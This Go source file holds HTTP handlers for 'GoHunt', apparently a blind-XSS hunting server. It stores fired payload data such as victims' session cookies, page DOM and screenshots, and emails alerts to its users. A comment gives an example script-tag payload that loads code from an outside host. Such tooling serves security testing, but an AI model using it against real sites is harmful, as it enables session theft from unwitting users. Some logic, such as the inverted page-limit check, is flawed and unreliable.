package application

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/NHAS/gohunt/application/models"
	"github.com/NHAS/gohunt/application/resources/notifications"

	"golang.org/x/crypto/bcrypt"
	gomail "gopkg.in/mail.v2"
	"gorm.io/gorm"
	"gorm.io/gorm/clause"
)

func defaultVal(headers http.Header, header, value string) {
	if headers.Get(header) == "" {
		headers.Set(header, value)
	}
}

// Middleware
func (a *Application) securityHeadersMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {

		h := w.Header()
		h.Set("X-Frame-Options", "deny")
		h.Set("Content-Security-Policy", "default-src 'self'")
		h.Set("X-XSS-Protection", "1; mode=block")
		h.Set("X-Content-Type-Options", "nosniff")

		defaultVal(h, "Access-Control-Allow-Headers", "X-CSRF-Token, Content-Type")
		defaultVal(h, "Access-Control-Allow-Origin", "https://"+a.config.Domain)
		defaultVal(h, "Access-Control-Allow-Methods", "OPTIONS, PUT, DELETE, POST, GET")
		defaultVal(h, "Access-Control-Allow-Credentials", "true")

		h.Set("Cache-Control", "no-cache, no-store, must-revalidate")
		h.Set("Pragma", "no-cache")
		h.Set("Expires", "0")

		next.ServeHTTP(w, r)
	})
}

func (a *Application) getUserFromSubdomain(r *http.Request) (*models.User, error) {

	domain := strings.TrimSuffix(r.Host, "."+a.config.Domain)

	var user models.User
	if err := a.db.Where("domain = ?", domain).First(&user).Error; err != nil {
		return nil, err
	}
	return &user, nil
}

var domainRegex = regexp.MustCompile(`^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?$`)

// Handlers
func (a *Application) registerHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	var userData models.CreateUserRequest
	if err := jsonDecoder(r.Body).Decode(&userData); err != nil {
		models.Message(w, false, "Invalid body")
		return
	}

	if userData.Domain == "" {
		models.Message(w, false, "Domain is empty")
		return
	}

	if !domainRegex.MatchString(userData.Domain) {
		models.Message(w, false, "Invalid domain, only alphanumb and -, .")
		return
	}

	// Check if username exists
	var existingUser models.User
	if err := a.db.Where("username = ?", userData.Username).First(&existingUser).Error; !errors.Is(err, gorm.ErrRecordNotFound) {
		models.Message(w, false, "Username already exists")
		return
	}

	if err := a.db.Where("domain = ?", userData.Domain).First(&existingUser).Error; !errors.Is(err, gorm.ErrRecordNotFound) {
		models.Message(w, false, "Domain already registered")
		return
	}

	// Create new user
	user := models.User{
		UserDTO: models.UserDTO{
			Username:     userData.Username,
			Email:        userData.Email,
			Domain:       userData.Domain,
			EmailEnabled: userData.EmailEnabled,
			FullName:     userData.Fullname,
		},
	}

	b, err := bcrypt.GenerateFromPassword([]byte(userData.Password), 10)
	if err != nil {
		models.Message(w, false, "Server Error")
		return
	}

	user.Password = string(b)

	if err := a.db.Create(&user).Error; err != nil {
		log.Println("failed to save user in database: ", err)
		models.Message(w, false, "Server Error")
		return
	}

	var newUser models.User
	if err := a.db.Where("username = ?", userData.Username).First(&newUser).Error; err != nil {
		http.Error(w, "Error creating user", http.StatusInternalServerError)
		models.Message(w, false, "Error fetching new user")

		return
	}

	log.Printf("New user successfully registered with username of %q and email of %q", user.Username, user.Email)

	// Create session
	sessId := a.store.StartSession(w, r, SessionEntry{
		UUID: newUser.UUID,
	}, nil)

	csrfToken, err := a.store.GenerateCSRFFromSession(sessId)
	if err != nil {
		models.Message(w, false, "Failed to generate CSRF token")
		return
	}

	a.writeJson(w, map[string]interface{}{
		"success":    true,
		"csrf_token": csrfToken,
	})
}

func (a *Application) loginHandler(w http.ResponseWriter, r *http.Request) {
	_, s := a.store.GetSessionFromRequest(r)
	if s != nil {

		var testUser models.User
		err := a.db.Where("uuid = ?", s.UUID).First(&testUser).Error
		if err == nil {

			csrfToken, err := a.store.GenerateCSRFToken(r)
			if err != nil {
				http.Error(w, "Failed to generate csrf token", http.StatusInternalServerError)
				return
			}

			res := struct {
				Success   bool   `json:"success"`
				CsrfToken string `json:"csrf_token"`
			}{
				Success:   true,
				CsrfToken: csrfToken,
			}

			a.writeJson(w, res)
			return
		}
	}

	var loginRequest models.LoginUserRequest
	if err := jsonDecoder(r.Body).Decode(&loginRequest); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	var existingUser models.User
	err := a.db.Where("username = ?", loginRequest.Username).First(&existingUser).Error
	if err != nil {
		log.Println("Invalid username or password supplied")
		log.Printf("Someone failed to log in as %q", loginRequest.Username)

		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	// Compare the stored hashed password with the provided password
	if !existingUser.ComparePassword(loginRequest.Password) {
		log.Printf("Invalid password supplied for %q", loginRequest.Username)
		http.Error(w, "Invalid credentials", http.StatusUnauthorized)
		return
	}

	// Create session
	sessId := a.store.StartSession(w, r, SessionEntry{
		UUID: existingUser.UUID,
	}, nil)

	csrfToken, err := a.store.GenerateCSRFFromSession(sessId)
	if err != nil {
		log.Println("failed to generate csrf token")
		http.Error(w, "Failed to generate CSRF token", http.StatusInternalServerError)
		return
	}

	res := struct {
		Success   bool   `json:"success"`
		CsrfToken string `json:"csrf_token"`
	}{
		Success:   true,
		CsrfToken: csrfToken,
	}

	a.writeJson(w, res)

	log.Printf("%q logged in", existingUser.Username)
}

func (a *Application) getAuthenticatedUser(r *http.Request) *models.User {
	_, s := a.store.GetSessionFromRequest(r)
	if s == nil {
		return nil
	}

	var existingUser models.User

	if err := a.db.Where("uuid = ?", s.UUID).First(&existingUser).Error; err != nil {
		return nil
	}

	return &existingUser
}

/*
getCollectedPagesHandler Endpoint for querying for collected pages.

# By default returns past 25 payload fires

Params:

	offset
	limit
*/
func (a *Application) getCollectedPagesHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	offset, err := strconv.Atoi(r.URL.Query().Get("offset"))
	if err != nil {
		offset = 0
	}

	limit, err := strconv.Atoi(r.URL.Query().Get("limit"))
	if err != nil {
		limit = 25
	}

	limit = max(limit, 300)

	var pages []models.CollectedPage

	if err := a.db.Where("owner_id = ?", user.UUID).Order("timestamp desc").Limit(limit).Offset(offset).Find(&pages).Error; err != nil {
		log.Println("failed", err)
		http.Error(w, "Failed", http.StatusBadRequest)
		return
	}

	var count int64
	if err := a.db.Model(&models.CollectedPage{}).Where("owner_id = ?", user.UUID).Count(&count).Error; err != nil {
		log.Println("failed to count", err)
		http.Error(w, "Failed", http.StatusBadRequest)
		return
	}

	var response models.CollectedPageResponse
	response.Results = []models.CollectedPageDTO{}

	for i := range pages {
		response.Results = append(response.Results, pages[i].DTO())
	}

	response.Total = count
	response.Success = true

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(&response)
}

func (a *Application) collectPageHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet && r.Method != http.MethodOptions {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, GET, HEAD, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "X-Requested-With")

	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusOK)
		return
	}

	user, err := a.getUserFromSubdomain(r)
	if err != nil {
		log.Printf("Invalid domain %q", r.Host)
		http.NotFound(w, r)
		return
	}

	var req models.CollectedPageRequest
	if err = jsonDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	var collectedPage models.CollectedPage
	collectedPage.PageHTML = req.PageHTML
	collectedPage.URI = req.URI
	collectedPage.Timestamp = time.Now().Unix()
	collectedPage.OwnerID = user.UUID

	if err := a.db.Create(&collectedPage).Error; err != nil {
		http.Error(w, "Error adding page", http.StatusInternalServerError)
		return
	}

	log.Printf("Received a collected page for user %q with a URI of  %q", user.Username, collectedPage.URI)

	w.WriteHeader(http.StatusOK)
}

func (a *Application) writeJson(w http.ResponseWriter, model interface{}) {
	w.Header().Set("Content-Type", "application/json")
	err := json.NewEncoder(w).Encode(model)
	if err != nil {
		log.Println("failed to write model: ", err)
	}
}

func (a *Application) deleteCollectedPageHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	var toDelete models.CollectedPageDeleteRequest
	err := jsonDecoder(r.Body).Decode(&toDelete)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	var page models.CollectedPage
	if err := a.db.Unscoped().Clauses(clause.Returning{}).Where("owner_id = ? AND uuid = ?", user.UUID, toDelete.UUID).Delete(&page).Error; err != nil {
		log.Println("failed", err)
		http.Error(w, "Failed", http.StatusBadRequest)
		return
	}

	log.Println("User is deleting collected page with the URI of ", page.URI)

	a.writeJson(w, models.CollectedPageDeleteResponse{
		Success: true,
		Message: "Collected page deleted!",
	})
}

func (a *Application) deleteInjectionHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	var toDelete models.InjectionDeleteRequest
	err := jsonDecoder(r.Body).Decode(&toDelete)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	var injection models.Injection
	if err := a.db.Unscoped().Clauses(clause.Returning{}).Where("owner_id = ? AND uuid = ?", user.UUID, toDelete.UUID).Delete(&injection).Error; err != nil {
		log.Println("failed", err)
		http.Error(w, "Failed", http.StatusBadRequest)

		models.Message(w, false, "Not found")
		return
	}

	log.Printf("User deleted injection record with an id of %q", toDelete.UUID)

	models.Message(w, true, "Injection deleted!")
}

func (a *Application) userInformationHandler(w http.ResponseWriter, r *http.Request) {
	// GET
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	a.writeJson(w, user.DTO())
}

func (a *Application) editUserInformationHandler(w http.ResponseWriter, r *http.Request) {
	// PUT
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	var editReq models.EditUserRequest
	err := jsonDecoder(r.Body).Decode(&editReq)
	if err != nil {
		log.Println("Failed to decode body: ", err)
		models.Boolean(w, false)
		return
	}

	if editReq.CurrentPassword == "" {
		log.Printf("User  %q did not enter in current password to edit settings ", user.Username)
		models.Message(w, false, "No current password supplied")
		return
	}

	if !user.ComparePassword(editReq.CurrentPassword) {
		log.Printf("User %q entered incorrect current password to edit settings", user.Username)
		models.Message(w, false, "Incorrect current password")
		return
	}

	user.FullName = editReq.FullName
	user.Email = editReq.Email
	user.Password = editReq.Password
	if editReq.Password != "" {
		b, err := bcrypt.GenerateFromPassword([]byte(editReq.Password), 10)
		if err != nil {
			http.Error(w, "Server Error", http.StatusInternalServerError)
			return
		}

		user.Password = string(b)
	}
	user.EmailEnabled = editReq.EmailEnabled
	user.ChainloadURI = editReq.ChainloadURI
	user.PageCollectionPaths = editReq.PageCollectionPaths
	user.PGPKey = editReq.PGPKey

	if err := a.db.Updates(user).Error; err != nil {
		log.Println("failed to save updated user object: ", err)
		models.Message(w, false, fmt.Sprintf("Failed to save user: %s", err))
		return
	}

	log.Printf("User %q just updated their profile information.", user.Username)

	user = a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	response := struct {
		models.UserDTO
		Success bool `json:"success"`
	}{
		UserDTO: user.UserDTO,
		Success: true,
	}

	a.writeJson(w, response)
}

func (a *Application) sendJSPGPMail(to string, pgpMessage string) {

	// Confedential mode is fine with sending a pgp encrypted message
	go a.sendMail(to, "[Go Hunt] XSS Payload Message (PGP Encrypted)", "text/plain", pgpMessage)
}

func (a *Application) sendJSInjectionMail(to string, injection models.Injection) {

	if a.config.Notification.Confidential {
		go a.sendMail(to, "[Go Hunt] XSS Payload Fired", "An XSS fired, you should check it out on https://"+a.config.Domain+" (confidential mode is on, no details will be reported via notification)")
		return
	}

	content, err := notifications.Render(nil, injection, "xss_email_template.htm")
	if err != nil {
		log.Println("Failed to render xss template for sending mail: ", err)
		return
	}

	go a.sendMail(to, fmt.Sprintf("[Go Hunt] XSS Payload Fired On %q", injection.VulnerablePage), "text/html", content)
}

func (a *Application) sendMail(to, subject, contentType string, content ...string) {
	// Create a new message
	message := gomail.NewMessage()

	// Set email headers
	message.SetHeader("From", a.config.Notification.SMTP.FromEmail)
	message.SetHeader("To", to)
	message.SetHeader("Subject", subject)

	// Set email body
	message.SetBody(contentType, strings.Join(content, "\n"))

	// Set up the SMTP dialer
	dialer := gomail.NewDialer(a.config.Notification.SMTP.Host, a.config.Notification.SMTP.Port, a.config.Notification.SMTP.Username, a.config.Notification.SMTP.Password)

	// Send the email
	if err := dialer.DialAndSend(message); err != nil {
		log.Println("failed to send email: ", err)
	} else {
		fmt.Println("Email notification sent successfully!")
	}
}

/*
getXSSPayloadFiresHandler is the endpoint for querying for XSS payload fire data.

# By default returns past 25 payload fires

Params:

	offset
	limit
*/
func (a *Application) getXSSPayloadFiresHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	offset, err := strconv.Atoi(r.URL.Query().Get("offset"))
	if err != nil {
		offset = 0
	}

	limit, err := strconv.Atoi(r.URL.Query().Get("limit"))
	if err != nil {
		limit = 25
	}

	limit = max(limit, 300)

	var injections []models.Injection
	if err := a.db.Where("owner_id = ?", user.UUID).Order("injection_timestamp desc").Limit(limit).Offset(offset).Find(&injections).Error; err != nil {
		log.Println("failed get injections", err)
		models.Boolean(w, false)
		return
	}

	var count int64
	if err := a.db.Model(&models.Injection{}).Where("owner_id = ?", user.UUID).Count(&count).Error; err != nil {
		log.Println("failed to count injections", err)
		models.Boolean(w, false)
		return
	}

	var response models.InjectionResponse
	response.Results = []models.Injection{}

	response.Results = append(response.Results, injections...)
	response.Total = count
	response.Success = true

	a.writeJson(w, response)
}

func (a *Application) contactUsHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	var contact models.ContactRequest
	err := jsonDecoder(r.Body).Decode(&contact)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	//TODO rate limit and recaptcha this

	sendMail := a.config.Notification.SMTP.Enabled && a.config.AbuseEmail != ""
	log.Println("Contact form was used, sending email: ", sendMail)

	if sendMail {

		message := fmt.Sprintf("Name: %q\n", contact.Name)
		message += fmt.Sprintf("Email: %q\n", contact.Email)
		message += fmt.Sprintf("Body: %q\n", contact.Body)

		go a.sendMail(a.config.AbuseEmail, "GoHunt Contact Form Submission", message, "text/plain")
	}

	models.Boolean(w, true)
}

func (a *Application) resendInjectionEmailHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	var i models.InjectionEmailRequest
	err := jsonDecoder(r.Body).Decode(&i)
	if err != nil {
		models.Boolean(w, false)
		return
	}

	var userInjection models.Injection
	if err := a.db.Where("owner_id = ? AND uuid = ?", user.UUID, i.UUID).First(&userInjection).Error; err != nil {
		log.Println("failed", err)
		models.Boolean(w, false)
		return
	}

	if user.EmailEnabled && a.config.Notification.SMTP.Enabled {
		a.sendJSInjectionMail(user.Email, userInjection)
	}

	log.Printf("User just requested to resend the injection record email for URI: %q", userInjection.VulnerablePage)
	models.Message(w, true, "Email sent!")
}

func (a *Application) logoutHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	a.store.DeleteSession(w, r)

	a.writeJson(w, struct{}{})
}

/*
This endpoint is for recording injection attempts.

It requires the following parameters:

request - This is the request (note: NOT specific to HTTP) which was performed to attempt the injection.
owner_correlation_key - This is a private key which is used to link the injection to a specific user - displayed in the settings panel.
injection_key - This is the injection key which the XSS payload uses to identify itself to the XSS Hunter service ( <script src=//x.xss.ht/aiwlq></script> where aiwlq is the key )

Sending two correlation requests means that the previous injection_key entry will be replaced.
*/
// func (a *Application) injectionRequestHandler(w http.ResponseWriter, r *http.Request) {
// 	defer r.Body.Close()
// 	var injectionRequest models.InjectionRequest

// 	err := jsonDecoder(r.Body).Decode(&injectionRequest)
// 	if err != nil {
// 		http.NotFound(w, r)
// 		return
// 	}

// 	newInjectionRequest := models.InjectionRequest{
// 		InjectionKey: injectionRequest.InjectionKey,
// 		Request:      injectionRequest.Request,

// 		OwnerCorrelationKey: injectionRequest.OwnerCorrelationKey,
// 	}

// 	var ownerUser models.User
// 	if err := a.db.Where("owner_correlation_key = ?", newInjectionRequest.OwnerCorrelationKey).First(&ownerUser).Error; err != nil {
// 		log.Println("owner_correlation_key not found: ", err)
// 		a.writeJson(w, models.InjectionAPIResponse{
// 			Success: false,
// 			Message: "Invalid owner correlation key provided!",
// 		})
// 		return
// 	}

// 	log.Printf("User %q just sent us an injection attempt with an ID of %q", ownerUser.Username, injectionRequest.InjectionKey)

// 	if err := a.db.Delete(models.InjectionRequest{}, "injection_key = ? AND owner_correlation_key = ?", injectionRequest.InjectionKey, ownerUser.OwnerCorrelationKey); err != nil {
// 		log.Println("failed to delete old entries: ", err)
// 		a.writeJson(w, models.InjectionAPIResponse{
// 			Success: false,
// 			Message: "Failed to delete previous entries",
// 		})
// 		return
// 	}

// 	if err := a.db.Create(&newInjectionRequest).Error; err != nil {
// 		log.Println("failed to create new entries: ", err)
// 		a.writeJson(w, models.InjectionAPIResponse{
// 			Success: false,
// 			Message: "Failed to create new entries",
// 		})

// 		return
// 	}

// 	a.writeJson(w, models.InjectionAPIResponse{
// 		Success: true,
// 		Message: "Injection request successfully recorded!",
// 	})
// }

func (a *Application) healthHandler(w http.ResponseWriter, r *http.Request) {

	m := models.InjectionRequest{InjectionKey: "test"}
	if err := a.db.Clauses(clause.Returning{}).Create(&m).Error; err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("Database error"))
		log.Println("Creating test injection for db healthcheck failed: ", err)
		return
	}

	if err := a.db.Unscoped().Delete(&m).Error; err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("Database error"))
		log.Println("Deleting test injection failed: ", err)

		return
	}

	w.Write([]byte("GOHUNTER_OK"))
}

// This is the handler that receives the XSS payload data upon it firing in someone's browser, it contains things such as session cookies, the page DOM, a screenshot of the page, etc.
func (a *Application) callbackHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodOptions && r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, GET, HEAD, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "X-Requested-With")

	if r.Method == http.MethodOptions {
		a.writeJson(w, struct{}{})
		return
	}

	ownerUser, err := a.getUserFromSubdomain(r)
	if err != nil {
		http.NotFound(w, r)
		return
	}

	contents, err := io.ReadAll(r.Body)
	if err != nil {
		log.Println("failed to read all contents of new JS callback: ", err)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	if bytes.HasPrefix(contents, []byte("-----BEGIN PGP MESSAGE-----")) && ownerUser.EmailEnabled && a.config.Notification.SMTP.Enabled {
		log.Printf("User %q just got a PGP encrypted XSS callback, passing it along.", ownerUser.Username)
		a.sendJSPGPMail(ownerUser.Email, string(contents))
		a.writeJson(w, struct{}{})
		return
	}

	var newInjection struct {
		models.Injection
		InjectionKey string `json:"injection_key"`
	}

	err = json.Unmarshal(contents, &newInjection)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	newInjection.InjectionTimestamp = time.Now().Unix()
	newInjection.OwnerID = ownerUser.UUID

	newInjection.CorrelatedRequest = "Could not correlate XSS payload fire with request!"
	if newInjection.InjectionKey != "[PROBE_ID]" {
		var request models.InjectionRequest
		if err := a.db.Where("injection_key = ? AND owner_correlation_key = ?", newInjection.InjectionKey, ownerUser.OwnerCorrelationKey).First(&request).Error; err == nil {
			newInjection.CorrelatedRequest = request.Request
		}
	}

	if err := a.db.Create(&newInjection.Injection).Error; err != nil {
		log.Println("failed to create new injection: ", err)
		http.Error(w, "Failed", http.StatusInternalServerError)
		return
	}

	log.Printf("User %q just got an XSS callback for URI %q", ownerUser.Username, "")

	if ownerUser.EmailEnabled && a.config.Notification.SMTP.Enabled {
		// Runs in its own goroutine
		a.sendJSInjectionMail(ownerUser.Email, newInjection.Injection)
	}

	a.writeJson(w, struct{}{})
}
